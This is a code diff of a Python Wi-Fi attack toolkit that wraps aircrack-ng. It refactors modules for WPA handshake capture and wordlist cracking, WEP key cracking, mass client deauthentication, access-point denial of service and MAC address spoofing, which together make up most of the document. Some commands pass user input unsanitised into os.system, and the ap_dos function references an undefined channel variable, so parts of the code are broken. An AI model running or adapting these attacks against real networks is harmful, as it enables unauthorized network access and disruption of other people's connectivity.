@@ -11,21 +11,19 @@ import socket
 from datetime import datetime
 
 def wpa_crack():
-	print("[+] This module requires a wordlist, you can generate one using the built-in module of this toolkit or use an existing one")
-	try:
-		print(Fore.MAGENTA + "[+] Use Ctrl + c at any time to proceed" + Style.RESET_ALL)
-		interface = input(Fore.YELLOW + "[?] Please specify the interface you wish to use: ")
-		subprocess.run(["ifconfig", interface, "down"])
-		# Kill processes in network
-		subprocess.run(["sudo", "airmon-ng", "check", "kill"])
-		subprocess.run(["iwconfig", interface, "mode", "monitor"])
-		subprocess.run(["ifconfig", interface, "up"])
+	interface = input(Fore.YELLOW + "\n[?] Please specify the interface you wish to use: " + Style.RESET_ALL)
+	subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+	subprocess.run(["sudo", "iwconfig", interface, "mode", "monitor"])
+	subprocess.run(["sudo", "ifconfig", interface, "up"])
+
+	def scan_nets():
+		# Band choice
+		print("[?] Check for 2G or 5G networks?")
+		print("--------------------------------")
+		print("[1] 2.4 Ghz Networks")
+		print("[2] 5 Ghz Networks")
+		band = int(input("[3] Both bands (slower speed)\n"))
 		try:
-			print("[?] Check for 2G or 5G networks?")
-			print("--------------------------------")
-			print("[1] 2.4 Ghz Networks")
-			print("[2] 5 Ghz Networks")
-			band = int(input("[3] Both bands (slower speed)\n" + Style.RESET_ALL))
 			if band == 1:
 				subprocess.run(["sudo", "airodump-ng", interface])
 			elif band ==2:
@@ -33,138 +31,201 @@ def wpa_crack():
 			elif band ==3:
 				subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
 			else:
-				print(Fore.MAGENTA + "[-] None of the above chosen, quitting program" + Style.RESET_ALL)
-		except ValueError:
-			print(Fore.MAGENTA + "[-] None of the above chosen, quitting program"+ Style.RESET_ALL)
-	except KeyboardInterrupt:
-		try:
-			print(Fore.YELLOW + "[?] Please specify the details of your desired network:")
-			print("-------------------------------------------------------")
-			bssid = input("[?] Router MAC address: ")
-			channel = input("[?] Channel used: ")
-			print("[+] Ctrl + c to proceed when you wish" + Style.RESET_ALL)
-
-			subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])
-
+				print("[-] None chosen, quitting...")
 		except KeyboardInterrupt:
-			try:
-				print(Fore.MAGENTA + "[+] Run Target deauth attack module on a client to disconnect them to proceed"+ Style.RESET_ALL)
-				cap_file = input("\n[?] Please specify the name of the CAP file you wish to use: ")
-				print("[+] Ctrl + c to proceed to crack CAP file when handshake has been captured")				
-				subprocess.run(["sudo", "airodump-ng", "-w", cap_file, "-c", channel, "--bssid", bssid, interface])
-			except KeyboardInterrupt:
-				try:
-					print(f"[-] Program finished, CAP file stored as {cap_file}.\n\n")
-					wordlist = input("[?] Please, specify the path of the wordlist you wish to use: ")
-					cap = cap_file + "-01.cap"
-					subprocess.run(["sudo", "aircrack-ng", cap, "-w", wordlist])
-				except KeyboardInterrupt:
-					print(Fore.MAGENTA + "[-] Program interrumpted by user, quitting..." + Style.RESET_ALL)
+			pass
+
+	def scan_ap():
+		print("[?] Please specify the details of your desired network:")
+		print("-------------------------------------------------------")
+		global bssid
+		bssid = input("[?] Access Point BSSID: ")
+		global channel
+		channel = input("[?] Channel used: ")
+		print("[+] Ctrl + c to proceed to attack when you wish")
+		time.sleep(2)
+		try:
+			subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])
+		except KeyboardInterrupt:
+			pass
+
+	def handshake_listener():
+		global cap_file
+		cap_file = input("\n[?] Please specify the name of the CAP file you wish to use to store passwd hash: ")
+		print(Fore.MAGENTA + '[+] Run the 3rd module of this toolkit (Client Deauth Attack) in another terminal tab to force a client to reconnect and create a handshake')
+		print("[+] Ctrl + c to proceed to crack CAP file when handshake has been captured" + Style.RESET_ALL)
+		time.sleep(5)		
+		try:
+			subprocess.run(["sudo", "airodump-ng", "-w", cap_file, "-c", channel, "--bssid", bssid, interface])
+		except KeyboardInterrupt:
+			pass
+
+	def hash_cracking():
+		print(f"[-] Program finished, CAP file stored as {cap_file}.\n\n")
+		wordlist = input("[?] Please, specify the path of the wordlist you wish to use: ")
+		try:
+			os.system(f'sudo aircrack-ng {cap_file}-01.cap -w {wordlist}')
+		except KeyboardInterrupt:
+			print(Fore.MAGENTA + "[-] Program interrumpted by user, quitting..." + Style.RESET_ALL)
+	
+	scan_nets()
+	scan_ap()
+	handshake_listener()
+	hash_cracking()
 	back_m()
 
 def wep_crack():
-	try:
+	def scan():
 		print(Fore.MAGENTA + "[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack." + Style.RESET_ALL)
 		interface = input(Fore.YELLOW + "[?] Please specify the interface you wish to use: " + Style.RESET_ALL)
 		subprocess.run(["ifconfig", interface, "down"])
 		subprocess.run(["sudo", "airmon-ng", "check", "kill"])
 		subprocess.run(["iwconfig", interface, "mode", "monitor"])
 		subprocess.run(["ifconfig", interface, "up"])
-		subprocess.run(["sudo","airodump-ng", interface, "--encrypt", "wep"])
-	except KeyboardInterrupt:
 		try:
-			print("[?] Please specify the details of your desired network:")
-			print("-------------------------------------------------------")
-			bssid = input("[?] Router MAC address: ")
-			channel = input("[?] Channel used: ")
-			file = input("[?] File name you wish to use for .cap file: ")
-			print("[+] Ctrl + c to proceed when you wish")
-
-			subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel,"--write", file, interface])
-
+			subprocess.run(["sudo","airodump-ng", interface, "--encrypt", "wep"])
 		except KeyboardInterrupt:
-			try:
-				print(f"[=] {file} generated, cracking password...\n\n")
-				subprocess.run(["sudo", "aircrack-ng", file])
-			except KeyboardInterrupt:
-				print("[-] Program finished by user, quitting...\n\n")
+			pass
+	
+	def attack():
+		print("[?] Please specify the details of your desired network:")
+		print("-------------------------------------------------------")
+		bssid = input("[?] Router MAC address: ")
+		channel = input("[?] Channel used: ")
+		global file
+		file = input("[?] File name you wish to use for .cap file: ")
+		print("[+] Ctrl + c to proceed when cap file is stored")
+		try:
+			subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel,"--write", file, interface])
+		except KeyboardInterrupt:
+			pass
+
+	def dehash():
+		print(f"[=] {file} generated, cracking password...\n\n")
+		try:
+			subprocess.run(["sudo", "aircrack-ng", file])
+		except KeyboardInterrupt:
+			print("[-] Program finished by user, quitting...\n\n")
+	scan()
+	attack()
+	dehash()
 	back_m()
 
 def deauth_attack():
+	
+	interface = input(Fore.YELLOW + "\n[?] Please specify the interface you wish to use: " + Style.RESET_ALL)
+	subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+	subprocess.run(["sudo", "iwconfig", interface, "mode", "monitor"])
+	subprocess.run(["sudo", "ifconfig", interface, "up"])
+	
+	def scan_nets():
+		# Band choice
+		print("[?] Check for 2G or 5G networks?")
+		print("--------------------------------")
+		print("[1] 2.4 Ghz Networks")
+		print("[2] 5 Ghz Networks")
+		band = int(input("[3] Both bands (slower speed)\n"))
+		try:
+			if band == 1:
+				subprocess.run(["sudo", "airodump-ng", interface])
+			elif band ==2:
+				subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
+			elif band ==3:
+				subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
+			else:
+				print("[-] None chosen, quitting...")
+		except KeyboardInterrupt:
+			pass
+	def scan_ap():
+		print("[?] Please specify the details of your desired network:")
+		print("-------------------------------------------------------")
+		bssid = input("[?] Access Point BSSID: ")
+		channel = input("[?] Channel used: ")
+		print("[+] Ctrl + c to proceed to attack when you wish")
+		try:
+			subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])
+		except KeyboardInterrupt:
+			pass
+	def attack():
+		bssid = input("[?] AP BSSID address: ")
+		target_bssid = input("[?] Client MAC address you wish to target: ")
+		channel = input("[?] Channel used: ")
+		subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
+		try:
+			subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
+		except KeyboardInterrupt:
+			pass
+	
 	print("[?] Do you wish to scan networks or skip to attack")
 	print("--------------------------------------------------")
 	print("[1] Scan")
 	choice = int(input("[2] Skip to attack\n"))
 	if choice == 1:
-		try:
-			print("\n[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
-			interface = input("\n[?] Please specify the interface you wish to use: ")
-			subprocess.run(["ifconfig", interface, "down"])
-			# Kill processes in network
-			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
-			subprocess.run(["iwconfig", interface, "mode", "monitor"])
-			subprocess.run(["ifconfig", interface, "up"])
-			try:
-				print("[?] Check for 2G or 5G networks?")
-				print("--------------------------------")
-				print("[1] 2.4 Ghz Networks")
-				print("[2] 5 Ghz Networks")
-				band = int(input("[3] Both bands (slower speed)\n"))
-				if band == 1:
-					subprocess.run(["sudo", "airodump-ng", interface])
-				elif band ==2:
-					subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
-				elif band ==3:
-					subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
-				else:
-					print("[-] None of the above chosen, quitting program")
-			except ValueError:
-				print("[-] None of the above chosen, quitting program")
-		except KeyboardInterrupt:
-			try:
-				print("[?] Please specify the details of your desired network:")
-				print("-------------------------------------------------------")
-				bssid = input("[?] Access Point BSSID: ")
-				channel = input("[?] Channel used: ")
-				print("[+] Ctrl + c to proceed when you wish")
-
-				subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])
-
-			except KeyboardInterrupt:
-				try:
-					target_bssid = input("[?] Client MAC address you wish to target: ")
-					print("[=] Running Deauth attack...\n\n")
-
-					subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
-				except KeyboardInterrupt:
-					print("[-] Program finished, quitting...\n\n")
+		scan_nets()
+		scan_ap()
+		attack()
+		back_m()
 	elif choice == 2:
+		attack()
+		back_m()
+	else:
+		print('[-] None chosen, quitting...')
+
+def ap_dos():
+	
+	interface = input(Fore.YELLOW + "\n[?] Please specify the interface you wish to use: " + Style.RESET_ALL)
+	subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+	subprocess.run(["sudo", "iwconfig", interface, "mode", "monitor"])
+	subprocess.run(["sudo", "ifconfig", interface, "up"])
+	
+	def scan_nets():
+		# Band choice
+		print("[?] Check for 2G or 5G networks?")
+		print("--------------------------------")
+		print("[1] 2.4 Ghz Networks")
+		print("[2] 5 Ghz Networks")
+		band = int(input("[3] Both bands (slower speed)\n"))
 		try:
-			interface = input("\n[?] Please specify the interface you wish to use: ")
-			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
-			subprocess.run(["iwconfig", interface, "mode", "monitor"])
-			subprocess.run(["ifconfig", interface, "up"])
-
-			bssid = input("[?] Router BSSID address: ")
-			target_bssid = input("[?] Client MAC address you wish to target: ")
-			channel = input("[?] Channel used: ")
-
-			subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
-			subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
+			if band == 1:
+				subprocess.run(["sudo", "airodump-ng", interface])
+			elif band ==2:
+				subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
+			elif band ==3:
+				subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
+			else:
+				print("[-] None chosen, quitting...")
 		except KeyboardInterrupt:
-			print("[-] Program finished, quitting...\n\n")
+			pass
+
+	def attack():
+		bssid = input("[?] AP BSSID address: ")
+		subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
+		try:
+			subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
+		except KeyboardInterrupt:
+			pass
+	
+	print("[?] Do you wish to scan networks or skip to attack")
+	print("--------------------------------------------------")
+	print("[1] Scan")
+	choice = int(input("[2] Skip to attack\n"))
+	if choice == 1:
+		scan_nets()
+		attack()
+		back_m()
+	elif choice == 2:
+		attack()
+		back_m()
 	else:
 		print("[-] None chosen, quitting...")
 	
-	back_m()
-
 def net_scan():
 	print(Fore.YELLOW + "[?] Please enter the range of your subnet: ")
 	ip_range = input(Fore.MAGENTA + "[+] Format: 192.168.1.1/24\n" + Style.RESET_ALL)
 	
 	arp_result = scapy.arping(ip_range)
 	print("-------------------------------------")
-	print("  MAC address	    Vendor  IP\n\n")
+	print("  MAC address	    Vendor    IP\n\n")
 	print(Fore.MAGENTA + "[-] Scan finished. If it failed to discover clients, run it again\n\n" + Style.RESET_ALL)
 	back_m()
 
@@ -412,69 +473,14 @@ def port_scan():
 		print("\n[-] Program ended by user, quitting...\n\n")
 	except ValueError:
 		print("\n[-] None chosen, Goodbye!\n\n")
-
-def ap_dos():
-	try:
-		print("[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
-		interface = input("[?] Please specify the interface you wish to use: ")
-		subprocess.run(["ifconfig", interface, "down"])
-		# Kill processes in network
-		subprocess.run(["sudo", "airmon-ng", "check", "kill"])
-		subprocess.run(["iwconfig", interface, "mode", "monitor"])
-		subprocess.run(["ifconfig", interface, "up"])
-
-		print("[?] Do you wish to scan networks or skip to attack")
-		print("------------------------------------------------------")
-		print("[1] Scan")
-		choice = int(input("[2] Skip to attack\n"))
-		if choice == 1:
-			try:
-				print("[?] Check for 2G or 5G networks?")
-				print("--------------------------------")
-				print("[1] 2.4 Ghz Networks")
-				print("[2] 5 Ghz Networks")
-				band = int(input("[3] Both bands (slower speed)\n"))
-				if band == 1:
-					subprocess.run(["sudo", "airodump-ng", interface])
-				elif band ==2:
-					subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
-				elif band ==3:
-					subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
-				else:
-					print("[-] None of the above chosen, quitting program")
-			except ValueError:
-				print("[-] None of the above chosen, quitting program")
-			except KeyboardInterrupt:
-				try:
-					bssid = input("[?] Access Point BSSID: ")
-					channel = input("[?] Channel used: ")
-					subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
-					print("\n[=] Running Deauth attack...\n\n")
-					subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
-				except KeyboardInterrupt:
-					print("[-] Program finished, quitting...\n\n")
-		elif choice == 2:
-			try:
-				bssid = input("[?] Access Point BSSID: ")
-				channel = input("[?] Channel used: ")
-				subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
-				print("\n[=] Running Deauth attack...\n\n")
-				subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
-			except KeyboardInterrupt:
-				print("[-] Program finished, quitting...\n")
-		else:
-			print("[-] None of the above chosen, quitting program")
-	except KeyboardInterrupt:
-		print("[-] Program interrumpted by user, quitting...\n\n")
-
-	except ValueError:
-		print("[-] None of the above chosen, quitting program")		
+	back_m()	
 			
 def mac_changer():
 	interface = input(Fore.YELLOW + "[?] Please input the name of the interface you wish to change it's MAC address: " + Style.RESET_ALL)
 	os.system(f'sudo ifconfig {interface} down')
 	os.system(f'sudo macchanger -A {interface}')
 	os.system(f'ifconfig {interface} up')
+	back_m()
 		
 
 def logo():
@@ -493,7 +499,6 @@ ____________ _____ _   _  ______ _____
 \____/\____/\____/\_| \_/\____/\_| \_| """)
 
 def back_m():
-	time.sleep(1)
 	menu = int(input(Fore.YELLOW + """
 [?]--Return to main menu?
 -------------------------
@@ -502,7 +507,7 @@ def back_m():
 """))
 	if menu == 1:
 		print(Fore.YELLOW + "[+]--Returning to main menu...")
-		time.sleep(2)
+		time.sleep(1)
 		os.system("clear")
 		logo()
 		main_menu()
